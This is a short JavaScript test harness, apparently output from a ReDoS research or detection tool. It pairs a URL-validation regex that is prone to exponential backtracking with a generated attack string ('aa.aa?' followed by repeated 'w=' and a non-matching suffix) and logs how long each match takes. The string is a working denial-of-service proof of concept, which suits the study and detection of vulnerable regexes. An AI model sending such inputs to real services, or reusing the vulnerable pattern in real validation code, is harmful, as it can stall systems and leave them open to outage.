/* 8292
 * ^((https|http)://)?(www.)?(([a-zA-Z0-9\-]{2,})\.)+([a-zA-Z0-9\-]{2,4})(/[\w\.]{0,})*((\?)(([\w\%]{0,}=[\w\%]{0,}&?)|[\w]{0,})*)?$
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:"aa.aa?"+"w="*16+"! _1_EOD(i4)"
 */
var REGEX = new RegExp("^((https|http)://)?(www.)?(([a-zA-Z0-9\-]{2,})\.)+([a-zA-Z0-9\-]{2,4})(/[\w\.]{0,})*((\?)(([\w\%]{0,}=[\w\%]{0,}&?)|[\w]{0,})*)?$")
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = 'aa.aa?' + 'w='.repeat(i*1) + '! _1_EOD(i4)'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}